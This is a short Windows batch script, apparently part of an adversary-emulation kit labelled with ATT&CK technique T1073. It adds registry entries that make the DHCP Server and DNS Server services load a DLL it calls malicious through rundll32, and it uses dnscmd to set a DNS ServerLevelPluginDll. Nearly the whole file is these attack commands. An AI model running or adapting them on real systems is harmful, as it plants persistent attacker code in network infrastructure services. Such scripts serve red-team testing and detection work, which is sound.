@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO DHCP Callout DLL installation (T1073)
ECHO.
ECHO [+] Replacing the DHCP Server dll with Malicious dll
ECHO -------------------------------------------------------------------
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DHCPServer\Parameters\calloutDlls /t reg_expand_sz /v dlls /d "rundll32.exe %Utilities%Dll1_32.dll,rd3" /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DHCPServer\Parameters\CalloutEnabled /t reg_expand_sz /v dlls /d "rundll32.exe %Utilities%Dll1_32.dll,rd2" /f
ECHO.
ECHO ===========================================================================
ECHO DNS ServerLevelPluginDll Install (T1073)
ECHO.
ECHO [+] Replacing the DNS ServerLevelPluginDll with Malicious dll
ECHO -------------------------------------------------------------------
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll /t reg_expand_sz /v dlls /d "rundll32.exe %Utilities%Dll1_32.dll,rd3" /f
ECHO.

ECHO [+] DNS ServerLevelPluginDll using DNScmd
ECHO -------------------------------------------------------------------
%Utilities%dnscmd.exe /config /serverlevelplugindll *
ECHO.

